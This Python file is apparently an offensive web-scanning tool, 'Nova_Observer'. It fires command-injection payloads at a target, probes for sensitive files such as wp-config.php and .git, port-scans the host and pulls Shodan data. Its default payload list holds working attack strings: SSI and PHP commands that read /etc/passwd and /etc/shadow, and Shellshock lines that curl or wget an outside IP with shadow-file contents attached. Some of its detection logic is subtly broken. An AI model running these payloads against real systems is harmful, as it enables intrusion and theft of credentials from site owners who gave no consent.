import requests,os,socket,chardet,sys,pathlib,re,argparse,json,random,traceback,ssl,itertools as it
from datetime import datetime
from urllib.parse import urlparse,quote
from multiprocessing import Pool

banner = r"""
     __                    ___ _                                  
  /\ \ \_____   ____ _    /___\ |__  ___  ___ _ ____   _____ _ __ 
 /  \/ / _ \ \ / / _` |  //  // '_ \/ __|/ _ \ '__\ \ / / _ \ '__|
/ /\  / (_) \ V / (_| | / \_//| |_) \__ \  __/ |   \ V /  __/ |   
\_\ \/ \___/ \_/ \__,_| \___/ |_.__/|___/\___|_|    \_/ \___|_|   
                                                                  
Version β
by Alecto_Fsociety (https://github.com/Alecto-Fsociety)
"""

print(banner)

class Nova_Observer:

    def __init__(self,target_url,port,status_add,method,payload_path,traversal_path,ua_path,port_scan_ports):
        
        self.target_url = target_url
        self.base = urlparse(self.target_url)
        self.scheme = self.base.scheme 
        self.domain = self.base.netloc
        self.path = self.base.path
        self.ip = socket.gethostbyname(self.domain)

        self.port = port if port else (443 if self.scheme == "https" else 80)

        self.status_list = {"200","301","302"}
        [self.status_list.add(status) for status in status_add] if status_add else self.status_list

        self.keywords = {"root:x:0:0:root","root:!:","127.0.0.1","SELECT","X-XSS-Protection: 0"}

        self.method = method.lower()

        self.date = datetime.now()
        self.date_tags = f"{self.date.year}_{self.date.month}-{self.date.day}_{self.date.hour}-{self.date.minute}"

        self.payload_dir_name = "Payload_logs"
        self.payload_file_name = f"{self.date_tags}_checked.log"

        self.err_dir_name = "Err_Checked_logs"
        self.err_file_name = "err.log"

        self.payload_path = payload_path
        self.payload_wordlist_cache = self.payload_dbs() if self.payload_path else self.cmd_injection()

        self.cycle = it.cycle(r"/-\|")

        self.shodan_api_url = "https://internetdb.shodan.io/"

        self.report_dir_name = "Report_Logs"
        self.report_file_name = f"{self.date_tags}_{self.domain}_report.md"

        self.traversal_path = traversal_path
        self.traversal_wordlist_cache = self.traversal_wordlists() if self.traversal_path else self.common_sample()

        self.traversal_dir_name = "Traversal_Logs"
        self.traversal_file_name = f"{self.date_tags}_traversal.log"

        self.ua_path = ua_path 
        self.ua_cache = self.custom_ua_lists() if self.ua_path else self.ua_lists()

        self.port_dir_name = "Port_Scan_Logs"
        self.port_file_name = f"{self.date_tags}_port_scan.log"

        self.start_port = port_scan_ports[0]
        self.end_port = port_scan_ports[1]
    
    def ua_lists(self):
        return ['Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, ',
                'like Gecko) Chrome/0.2.149.27 Safari/525.13',
                'iCab/4.0  (Windows; U; Windows NT 6.0; en-gb)',
                'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061212 ',
                'Iceweasel/3.0.6 (Debian-3.0.6-1)',
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.16) Gecko/20101130 ',
                'Firefox/3.5.16 FirePHP/0.4',
                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET ',
                'CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; ',
                'OfficeLiveConnector.1.4; OfficeLivePatch.1.3; GreenBrowser)',
                'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.7 ',
                '(KHTML, like Gecko) RockMelt/0.8.36.116 Chrome/7.0.517.44 Safari/534.7',
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.11) Gecko/20050729',
                'Mozilla/5.0 Galeon/1.2.8 (X11; Linux i686; U;) Gecko/20030317',
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.6 (KHTML, ',
                'like Gecko) Chrome/7.0.500.0 Safari/534.6',
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA; rv:1.4) Gecko/20030624 ',
                'Netscape/7.1 (ax)',
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040514',
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009032809 ',
                'Iceweasel/3.0.7 (Debian-3.0.7-1)',
                'Mozilla/5.0 (compatible; Konqueror/3.0-rc2; i686 Linux; 20020106)',
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.14) Gecko/20110218 ',
                'Firefox/3.6.14',
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0.1) Gecko/20021104 ',
                'Chimera/0.6']

    def custom_ua_lists(self):
        return [ua.strip("\n") for ua in open(self.ua_path,"r",encoding="utf-8").readlines()]

    def traversal_wordlists(self):
        return [traversal.strip("\n") for traversal in open(self.traversal_path,"r",encoding="utf-8").readlines()]

    def common_sample(self):
        return ['images',
                'index.php',
                'sitemap.xml',
                'css',
                'js',
                'wp-content',
                'wp-content/mysql.sql',
                'robots.txt',
                'assets',
                'wp-admin',
                'wp-includes',
                'img',
                'fonts',
                'license.txt',
                'wp-login.php',
                'xmlrpc.php',
                'wp-load.php',
                'wp-blog-header.php',
                'wp-trackback.php',
                'wp-mail.php',
                'wp-links-opml.php',
                'vendor',
                'wp-cron.php',
                'wp-comments-post.php',
                'wp-activate.php',
                'wp-settings.php',
                'wp-signup.php',
                'wp-config-sample.php',
                '.htaccess',
                'wp-config.php',
                '.git']



    def cmd_injection(self):
        return ['&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;',
                '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;',
                ";system('cat%20/etc/passwd')",
                '%0Acat%20/etc/passwd',
                '%0Acat%20/etc/passwd',
                '() { :;}; /bin/bash -c "curl ',
                'http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\`grep root ',
                '/etc/shadow\\`"',
                '() { :;}; /bin/bash -c "wget ',
                'http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root ',
                '/etc/shadow\\`"',
                'cat /etc/hosts',
                '$(`cat /etc/passwd`)',
                'cat /etc/passwd',
                '| ls -laR /etc',
                '; ls -laR /etc',
                '& ls -laR /etc',
                '&& ls -laR /etc',
                '| ls -l /etc/',
                '; ls -l /etc/',
                '& ls -l /etc/',
                '&& ls -l /etc/',
                'ls -l /etc/',
                'ls -lh /etc/',
                '<!--#exec cmd="/bin/cat /etc/passwd"-->',
                '<!--#exec cmd="/bin/cat /etc/shadow"-->',
                '<?php system("cat /etc/passwd");?>',
                ";system('cat%20/etc/passwd')",
                "system('cat /etc/passwd');",
                'which netcat',
                '{{ get_user_file("/etc/hosts") }}',
                '{{ get_user_file("/etc/passwd") }}']

    def payload_dbs(self):
        return [wordlist.strip("\n") for wordlist in open(self.payload_path,"r",encoding="utf-8").readlines()]

    def get_headers(self,path,domain,payload):
        return f"GET /{path}?payl0ad={quote(payload)} HTTP/1.1\r\nHost:{domain}\r\nUser-Agent:{random.choice(self.ua_cache)}\r\nConnection:close\r\nAccept:*/*\r\n\r\n"

    def post_headers(self,path,domain,payload):
        data = f"payl0ad={quote(payload)}"
        return f"POST /{path} HTTP/1.1\r\nHost:{domain}\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:{len(data)}\r\nUser-Agent:{random.choice(self.ua_cache)}\r\nConnection:close\r\nAccept:*/*\r\n\r\n{data}\r\n\r\n"
        
    def traversal_get_headers(self,path):
        return f"GET /{path} HTTP/1.1\r\nHost:{self.domain}\r\nUser-Agent:{random.choice(self.ua_cache)}\r\nConnection:close\r\nAccept:*/*\r\n\r\n"

    def parse_headers(self,response_data,payload):
        headers = {}
        match = re.search(r"HTTP/\d\.\d (\d+)",response_data)
        status = match.group(1) if match else "000"

        headers["url"] = self.target_url
        headers["status"] = status
        headers["payload"] = payload
        for line in response_data.split("\r\n"):
            match = re.match(r"([^:]+): (.+)", line)
            if match:
                key, value = match.groups()
                headers[key] = value

            if line in self.keywords:
                headers["detection"] = True
            else:
                headers["detection"] = False

        return headers

    def payload_checkers(self):
        pathlib.Path(self.payload_dir_name).mkdir(exist_ok=True)
        lines = len(self.payload_wordlist_cache)
        for point,payload in enumerate(self.payload_wordlist_cache,start=1):
            try:
                if self.method == "post":
                    headers = self.post_headers(self.path,self.domain,payload)
                elif self.method == "get":
                    headers = self.get_headers(self.path,self.domain,payload)
                        
                if self.scheme == "https":
                    with (ssl.create_default_context()).wrap_socket(
                            socket.create_connection((self.domain,self.port)),server_hostname=self.domain
                            )as ssock:

                        ssock.settimeout(3)
                        ssock.send(bytes(headers,"utf-8"))

                        response = b""
                        while True:
                            packet = ssock.recv(1024*10)
                            if len(packet) <= 0:
                                break
                            response += packet

                        detected = chardet.detect(response)
                        encoding = detected["encoding"] if detected["encoding"] else "utf-8"
                        response_data = response.decode(encoding)

                        sys.stdout.write(f"\r[>] Payload_Check / {self.domain}:{self.port} / <{point}/{lines}> [{next(self.cycle)}] ~ {payload} ")
                        sys.stdout.flush()

                        headers = self.parse_headers(response_data,payload)
                            
                        if headers["status"] in self.status_list:
                            with open(f"{self.payload_dir_name}/{self.payload_file_name}","a+",encoding="utf-8")as files:
                                files.write(f"{json.dumps(headers)}\n")
                            
                else:
                    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
                        sock.settimeout(3)
                        sock.connect((self.domain,self.port))
                        sock.sendall(bytes(headers,"utf-8"))

                        response = b""
                        while True:
                            packet = sock.recv(1024*10)
                            if len(packet) <= 0:
                                break
                            response += packet
                            
                        detected = chardet.detect(response)
                        encoding = detected["encoding"] if detected["encoding"] else "utf-8"
                        response_data = response.decode(encoding)

                        sys.stdout.write(f"\r[>] Payload_Check / {self.domain}:{self.port} / <{point}/{lines}> [{next(self.cycle)}] ~ {payload}")
                        sys.stdout.flush()

                        headers = self.parse_headers(response_data,payload)
                        if headers["status"] in self.status_list:
                            with open(f"{self.payload_dir_name}/{self.payload_file_name}","a+",encoding="utf-8")as files:
                                files.write(f"{json.dumps(headers)}\n")
                                  
            except Exception as e:
                pathlib.Path(self.err_dir_name).mkdir(exist_ok=True)
                with open(f"{self.err_dir_name}/{self.err_file_name}","a+",encoding="utf-8")as err_files:
                    err_files.write(f"\n[-] Error {e} date {self.date_tags}\n{traceback.format_exc()}")

    def multi_traversal(self):
        pathlib.Path(self.traversal_dir_name).mkdir(exist_ok=True)
        lines = len(self.traversal_wordlist_cache)
        for point,path in enumerate(self.traversal_wordlist_cache,start=1):
            try:
                if self.scheme == "https":
                    with (ssl.create_default_context()).wrap_socket(
                            socket.create_connection((self.domain,self.port)),server_hostname = self.domain
                            )as ssock:

                        ssock.settimeout(3)
                        ssock.send(bytes(self.traversal_get_headers(path),"utf-8"))

                        response = b""
                        while True:
                            packet = ssock.recv(1024*10)
                            if len(packet) <= 0:
                                break
                            response += packet

                        detected = chardet.detect(response)
                        encoding = detected["encoding"] if detected["encoding"] else "utf-8"
                        response_data = response.decode(encoding,errors="ignore")
                        
                        match = re.search(r"HTTP/\d\.\d (\d+)",response_data)
                        status = match.group(1) if match else "000"

                        sys.stdout.write(f"\r[>] Traversal_Checkers {self.domain} <{point}/{lines}> [{next(self.cycle)}] ~ {path}")
                        sys.stdout.flush()

                        if status in self.status_list:
                            with open(f"{self.traversal_dir_name}/{self.traversal_file_name}","a+",encoding="utf-8")as files:
                                files.write(f"[GET/{status}] {self.target_url}/{path}\n")
                        
                else:
                    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
                        sock.settimeout(3)
                        sock.connect((self.domain,self.port))
                        sock.sendall(bytes(self.traversal_get_headers(path),"utf-8"))
                        
                        response = b""
                        while True:
                            packet = sock.recv(1024*10)
                            if len(packet) <= 0:
                                break
                            response += packet

                        detected = chardet.detect(response)
                        encoding = detected["encoding"] if detected["encoding"] else "utf-8"
                        response_data = response.decode(encoding,errors="ignore")

                        match = re.search(r"HTTP/\d\.\d (\d+)",response_data)
                        status = match.group(1) if match else "000"

                        sys.stdout.write(f"\r[>] Traversal_Checkers {self.domain} <{point}/{lines}> [{next(self.cycle)}] ~ {path}")
                        sys.stdout.flush()

                        if status in self.status_list:
                            with open(f"{self.traversal_dir_name}/{self.traversal_file_name}","a+",encoding="utf-8")as files:
                                files.write(f"[GET/{status}] {self.target_url}/{path}\n")


            except Exception as e:
                pathlib.Path(self.err_dir_name).mkdir(exist_ok=True)
                with open(f"{self.err_dir_name}/{self.err_file_name}","a+",encoding="utf-8")as err_files:
                    err_files.write(f"[-] Error {e} date {self.date_tags}\n{traceback.format_exc()}\n")


    def check_logs_payload_checkers(self):
        path_name = f"{self.payload_dir_name}/{self.payload_file_name}"
        try:
            lines = open(path_name,"r",encoding="utf-8").readlines()
            data = [json.loads(line.strip()) for line in lines if line.strip()]

            data_dict = {}
            for json_datas in data:
                dumps_str = json.dumps(json_datas,sort_keys=True,separators=(",",":"))
                if dumps_str not in data_dict:
                    data_dict[dumps_str] = json_datas

            seen_payload = set()
            ends_data = []

            for json_data in data_dict.values():
                payload = json_data.get("payload")
                if payload and payload not in seen_payload:
                    seen_payload.add(payload)
                    ends_data.append(json_data)

            checked_file_name = f"{(os.path.basename(self.payload_file_name).split('.')[0])}_checked_{self.domain}.json"
            json_path_name = f"{self.payload_dir_name}/{checked_file_name}"
            with open(json_path_name,"w+",encoding="utf-8")as files:
                json.dump(ends_data,files,indent=1,ensure_ascii=False)

        except FileNotFoundError:
            sys.stdout.write(f"\n[*] No Logs\n")

        except KeyboardInterrupt:
            pass # Cannot Stop Writing!!

        try:
            return json_path_name
        except UnboundLocalError:
            return ""

    def check_logs_multi_traversal(self,list_data=[]):
        try:
            lines = [line.strip("\n") for line in open(f"{self.traversal_dir_name}/{self.traversal_file_name}","r",encoding="utf-8").readlines()]
            for data in lines:
                if data and data not in list_data:
                    list_data.append(data)
            new_file_name = ((self.traversal_file_name).split(".")[0]) + "_checked.log"
            with open(f"{self.traversal_dir_name}/{new_file_name}","w+",encoding="utf-8")as save_files:
                [save_files.write(f"{data}\n") for data in list_data]

        except FileNotFoundError:
            sys.stdout.write("\n[-] Traversal Not Logs...\n")

        except KeyboardInterrupt:
            pass

        try:
            return f"{self.traversal_dir_name}/{new_file_name}"
        except UnboundLocalError:
            return ""

    def port_scan(self,protocol="tcp",port_box=[]):
        pathlib.Path(self.port_dir_name).mkdir(exist_ok=True)
        for port in range(self.start_port,self.end_port + 1):
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
                sock.settimeout(1.5)
                sys.stdout.write(f"\r[+] Port_Scan {self.domain}:{port} ~ {next(self.cycle)}")
                sys.stdout.flush()
                
                if sock.connect_ex((self.ip,port)) == 0:
                    with open(f"{self.port_dir_name}/{self.port_file_name}","a+",encoding="utf-8")as files:
                        files.write(f"{socket.getservbyport(port,protocol)}/{port}\n")

    def check_logs_port_scan(self,list_data=[]):
        try:
            lines = [line.strip("\n") for line in open(f"{self.port_dir_name}/{self.port_file_name}","r",encoding="utf-8").readlines()]
            for data in lines:
                if data and data not in list_data:
                    list_data.append(data)
            new_file_name = ((self.port_file_name).split(".")[0]) + "_checked.log"
            with open(f"{self.port_dir_name}/{new_file_name}","w+",encoding="utf-8")as save_files:
                [save_files.write(f"{data}\n") for data in list_data]

        except FileNotFoundError:
            sys.stdout.write("\n[-] Port_Scan Not Logs...\n")

        except KeyboardInterrupt:
            pass
        try:
            return f"{self.port_dir_name}/{new_file_name}"
        except UnboundLocalError:
            return ""

    def shodan_api(self):
        ip = socket.gethostbyname(self.domain)
        shodan_url = f"{self.shodan_api_url}{ip}"
        headers = {"User-Agent":random.choice(self.ua_cache)}
        json_data = requests.get(shodan_url,headers=headers).text

        return json.loads(json_data)

    def report(self,file_path_payload,file_path_traversal,file_path_port,true_point=0,false_point=0,true_box=[]):
        check_none = {None,""}

        h_data = "# Nova_Observer Report\n"
        a_data = f"date : {self.date_tags}\n<br>Scan_Targets : {self.target_url}\n"

        used_tags = "## Used Method & Tools\n"

        used_data = f"- Payload_Checkers\n- Multi_Traversal\n- Port_Scan\n- API [ shodan : {self.shodan_api_url} ]\n"

        if file_path_payload in check_none:
            pass
        else:
            for json_data in json.loads(open(file_path_payload,"r",encoding="utf-8").read()):
                detection = json_data["detection"]

                if detection == check_none:
                    true_point += 1
                    true_box.append(f"- {json_data['payload']}\n")
                else:
                    false_point += 1

        if self.payload_path in check_none:
            mark_wordlist = "default_commad_injection_method_list\n"
        else:
            mark_wordlist = f"{self.payload_path}\n"
    
        payload_detection_tags = "## Payload_Checkers\n"
        custom_option = f"- Ports : {self.port}\n- Status_List : {self.status_list}\n- Method : {self.method}\n- Wordlist : {mark_wordlist}\n"
        payloads_script_tags = "### Payloads\n" 
        point_data = f"### detection \n- True : {true_point} \n- False : {false_point}\n"
        if true_box:
            payloads = f"{''.join(true_box)}"
        else:
            payloads = None

        traversal_tags = "\n## Multi_Traversal\n"
        if file_path_traversal:
            if self.traversal_path in check_none:
                mark_traversal = "default_common_method_list\n"
            else:
                mark_traversal = f"{self.traversal_path}\n"

            custom_option_traversal = f"- Wordlist : {mark_traversal}\n" 
            traversal_dbs = [f"- {traversal}" for traversal in open(file_path_traversal,"r",encoding="utf-8").readlines()]
            traversal_dbs_tags = f"{''.join(traversal_dbs)}" 
        else:
            custom_option_traversal = ""
            traversal_dbs_tags = ""

        ua_tags = "\n## User-Agent\n"
        if self.ua_path:
            ua_path_tags = f"- {self.ua_path}\n"
        else:
            ua_path_tags = "- default_ua_lists_method\n"

        shodan_dbs_tags = "\n## Shodan_Scan_Lists\n"
        used_shodan_urls = f"**[InternetDB Shodan API]({self.shodan_api_url}{self.ip})**\n"
        shodan_api = self.shodan_api()
        cpes = shodan_api["cpes"]
        hostname = shodan_api["hostnames"]
        ports = shodan_api["ports"]
        ip = shodan_api["ip"]
        tags = shodan_api["tags"]
        vulns = shodan_api["vulns"]
        shodan_logs = f"- CPE : {cpes}\n- HostName : {hostname}\n- IP : {ip}\n- Ports : {ports}\n- Tags : {tags}\n- Vulns : {vulns}\n"
        
        port_scan_tags = "\n## Port_Scan\n"
        try:
            port_scan_dbs = [f"- {port}" for port in open(file_path_port,"r",encoding="utf-8").readlines()]
            port_scan = f"{''.join(port_scan_dbs)}"
        except FileNotFoundError:
            port_scan = "- None\n"

        base_report = f"{h_data}{a_data}{used_tags}\n{used_data}{payload_detection_tags}{custom_option}{point_data}{payloads_script_tags}{payloads}\n{traversal_tags}{custom_option_traversal}{traversal_dbs_tags}{port_scan_tags}{port_scan}{shodan_dbs_tags}{used_shodan_urls}{shodan_logs}{ua_tags}{ua_path_tags}"

        pathlib.Path(self.report_dir_name).mkdir(exist_ok=True)
        with open(f"{self.report_dir_name}/{self.report_file_name}","w+",encoding="utf-8")as files:
            files.write(base_report)

        return f"{self.report_dir_name}/{self.report_file_name}"
        
def multi_instance_payload(payload_instance):
    payload_instance.payload_checkers()

def multi_instance_traversal(traversal_instance):
    traversal_instance.multi_traversal()

def multi_instance_port_scan(port_scan_instance):
    port_scan_instance.port_scan()

def main():
    try:
        arg = argparse.ArgumentParser()

        arg.add_argument("-url",type=str,required=True,help="[>] Scan_URL / -url <scan_url>")
        arg.add_argument("-p",type=int,required=False,help="[>] Custom_Port_Number / -p <port_number>")
        arg.add_argument("-m",type=str,required=False,default="GET",help="[>] Method [GET/POST] / -m <method>")
        arg.add_argument("-s",type=str,required=False,nargs="*",help="[>] Add_Status / -s <status_codes>")
        arg.add_argument("-payw",type=str,required=False,help="[>] Payload_WordList / -payw <payload_wordlist>")
        arg.add_argument("-traw",type=str,required=False,help="[>] Traversal_WordList / -traw <traversal_wordlist>")
        arg.add_argument("-cua",type=str,required=False,help="[>] Custom_User-Agent / -cua <ua_path>")
        arg.add_argument("-ps",type=int,required=False,default=[20,80],nargs=2,help="[>] Port_Scan_Ports / -ps <start_port> <end_port>")
        arg.add_argument("-t",type=int,required=False,default=4,help="[>] Thread_Number / -t <thread_number>")

        parse = arg.parse_args()

        print(f"\n[-OPTIONS-]\nScan_URL : {parse.url}\nCustom_Port_Number : {parse.p}\nMethod : {parse.m}\nAdd_Status : {parse.s}\nPayload_WordList : {parse.payw}\nTraversal_WordList : {parse.traw}\nCustom_User-Agent : {parse.cua}\nPort_Scan_Ports : {parse.ps}\nThread_Number : {parse.t}\n")

        print("[+] Start Payload_Checkers\n")
        instance = Nova_Observer(parse.url,parse.p,parse.s,parse.m,parse.payw,parse.traw,parse.cua,parse.ps)
        with Pool(parse.t)as pool_payload:
            pool_payload.starmap(multi_instance_payload, [(instance,)] * parse.t,chunksize=1)
        file_path_payload = instance.check_logs_payload_checkers()
        print("\n[+] Start Multi_Traversal\n")
        with Pool(parse.t)as pool_traversal:
            pool_traversal.starmap(multi_instance_traversal,[(instance,)] * parse.t,chunksize=1)
        file_path_traversal = instance.check_logs_multi_traversal()
        print("\n[+] Start Port_Scan\n")
        with Pool(parse.t)as pool_port:
            pool_port.starmap(multi_instance_port_scan, [(instance,)] * parse.t,chunksize=1)
        file_path_port = instance.check_logs_port_scan()

        print("\n[+] Build_Reports...\n")
        report_path = instance.report(file_path_payload,file_path_traversal,file_path_port)
        sys.stdout.write(f"\n[>>]  Writing Report -> {report_path}!!\n")
        
    except KeyboardInterrupt: 
        sys.stdout.write("\n[*] Stop_Nova_Observer...\n")

if __name__ == "__main__":
    sys.exit(main())

